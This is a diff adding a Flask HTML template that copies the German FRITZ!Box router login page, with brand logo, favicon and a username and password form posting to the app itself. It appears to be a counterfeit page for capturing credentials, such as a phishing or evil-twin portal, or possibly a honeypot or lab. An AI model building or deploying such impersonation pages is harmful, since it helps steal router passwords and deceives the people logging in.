@@ -1,1 +1,57 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <title>FRITZ!Box Login</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/styles.css') }}">
+    <link rel="shortcut icon" href="{{ url_for('static', filename='images/fritz.ico') }}" type="image/x-icon">
+</head>
+
+<body>
+    <main>
+        <div class="main">
+            <div class="heading-section">
+                <img src="{{ url_for('static', filename='images/logo.png') }}" class="logo-img">
+                <div class="a-ri8"><span>FRITZ!Box helps you manage your network with ease and security.</span></div>
+            </div>
+
+            <div class="form">
+                <form class="a-form" method="POST">
+                    <input type="text" id="Username" class="a-email" name="username" placeholder="Benutzername"
+                        autofocus="autofocus" required />
+                    <input type="password" id="Password" class="a-pss" name="password" placeholder="Kennwort"
+                        autofocus="autofocus" />
+                    <input type="submit" class="a-sub" value="Anmelden" />
+                    <a href="" class="a-link">Kennwort vergessen?</a>
+                    <hr class="a-hr">
+                </form>
+            </div>
+        </div>
+    </main>
+
+    <div class="footer">
+        <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
+            <ul>
+                <li>Deutsch</li>
+                <li><a href="">English</a></li>
+                <li><a href="">Español</a></li>
+                <li><a href="">Français</a></li>
+                <li><a href="">Italiano</a></li>
+            </ul>
+            <div id="line"></div>
+            <div>
+                <ul>
+                    <li><a href="">Über FRITZ!Box</a></li>
+                    <li><a href="">Datenschutz</a></li>
+                    <li><a href="">AGB</a></li>
+                    <li><a href="">Hilfe</a></li>
+                </ul>
+            </div>
+            <div class="copyright">
+                <div><span> FRITZ!Box © 2024</span></div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
 
